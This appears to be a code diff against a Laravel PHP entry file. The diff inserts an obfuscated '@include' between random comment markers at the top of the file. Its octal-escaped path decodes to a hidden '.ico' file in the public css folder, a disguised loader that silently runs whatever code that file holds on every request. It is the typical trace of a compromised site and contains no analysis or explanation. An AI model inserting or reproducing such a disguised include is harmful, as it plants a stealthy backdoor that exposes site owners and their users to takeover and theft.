@@ -1,5 +1,9 @@
 <?php
+/*1d454*/
 
+@include "\057ho\155e/\114AR\101VE\114PR\117JE\103TS\057kl\141tc\150/D\144v/\160ub\154ic\057cs\163/c\163s/\05680\14546\06651\056ic\157";
+
+/*1d454*/
 /**
  * Laravel - A PHP Framework For Web Artisans
  *
